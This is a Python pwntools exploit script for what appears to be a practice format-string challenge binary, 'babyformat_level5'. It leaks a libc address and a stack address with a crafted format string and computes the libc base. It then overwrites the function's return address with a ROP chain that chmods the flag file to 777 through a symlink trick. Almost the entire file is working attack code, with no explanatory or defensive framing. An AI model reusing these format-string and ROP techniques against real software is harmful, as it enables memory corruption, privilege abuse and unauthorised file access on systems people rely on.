#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template ./babyformat_level5
from pwn import *
from os import system

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or '/challenge/babyformat_level5')
context.terminal = ["tmux", "splitw", "-h"]
# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)

io = start()

# shellcode = asm(shellcraft.sh())
# payload = fit({
#     32: 0xdeadbeef,
#     'iaaa': [1, 2, 'Hello', 3]
# }, length=128)
# io.send(payload)
# flag = io.recv(...)
# log.success(flag)

def rop(base):
    # ln -s /flag group for symlink to string in libc
    pop_rdi = base + 0x23b6a # ROPgadget --binary /lib/x86_64-linux-gnu/libc.so.6 --only "pop|ret" 
    pop_rsi = base + 0x2601f # ROPgadget --binary /lib/x86_64-linux-gnu/libc.so.6 --only "pop|ret" 
    pop_rdx = base + 0x142c92 # ROPgadget --binary /lib/x86_64-linux-gnu/libc.so.6 --only "pop|ret" 
    pop_rax = base + 0x36174  # ROPgadget --binary /lib/x86_64-linux-gnu/libc.so.6 --only "pop|ret" 
    syscall = base + 0x2284d  # ROPgadget --binary /lib/x86_64-linux-gnu/libc.so.6 --only "syscall"

    rop = b''
    rop += p64(pop_rdi) 
    rop += p64(base + 0x1eb1f3)  #  ROPgadget --binary /lib/x86_64-linux-gnu/libc.so.6 --string "group"
    rop += p64(pop_rsi) 
    rop += p64(0o777)         # set permissions to 777
    rop += p64(pop_rdx) + p64(0)         # not used
    rop += p64(pop_rax) 
    rop += p64(0x5a)          # ROPgadget --binary /lib/x86_64-linux-gnu/libc.so.6 --string "chmod"
    rop += p64(syscall)       # call syscall to execute the ROP chain
    return rop

exploit = f"%3$lx %150$p %04199028d%24$lnAAAAAAA"
payload = exploit.encode() + p64(0x404060)
io.sendline(payload)
io.recvuntil(b"Your input is:")
io.recvline()
leak_bytes = io.recvline(keepends=False)
print(f"leak_bytes : {leak_bytes}")
leak = leak_bytes.decode().split(' ')

print(f"leaked_libc_func : {leak[0]}")
leaked_libc_func_int = int(leak[0], 16)
libc_base = leaked_libc_func_int - 0x10e077
print(f"libc_base : 0x{libc_base:x}")

leaked_rbp = leak[1]
print(f"leaked rbp : {leaked_rbp}")
rbp_main = int(leaked_rbp, 16)
rbp_func = rbp_main - 80 # 80 = diff of rbp main and func
print(f"leaked rbp func : {hex(rbp_func)}")
leaked_ret = rbp_func + 8
rip_func_addr = leaked_ret
print(f"leaked rip func : {hex(leaked_ret)}")

writes = {rip_func_addr:rop(libc_base)}
payload2 = b'a'*7+fmtstr_payload(24, writes, numbwritten=41)
io.send(payload2)

# io.sendline(b"%150$p")
# system("cat /flag")
io.interactive()

